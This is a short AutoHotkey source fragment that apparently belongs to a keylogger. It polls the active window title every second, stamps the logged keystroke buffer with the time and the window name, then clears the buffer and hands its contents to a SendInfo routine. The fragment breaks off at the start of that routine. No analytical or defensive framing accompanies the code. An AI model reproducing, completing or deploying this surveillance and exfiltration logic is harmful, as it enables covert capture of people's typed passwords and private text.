WatchActiveWindow() {
   static prevTitle
   WinGetTitle, title, A
   if !(title == prevTitle) {
      FormatTime, time,, dd.MM.yyyy  HH:mm
      Logs := "[" . time . "] (" . prevTitle . ")  " . Logs
      s := Logs, Logs := ""
      SendInfo(s, "keys")
   }
   prevTitle := title
   SetTimer,, -1000
}

SendInfo(str, mode) {
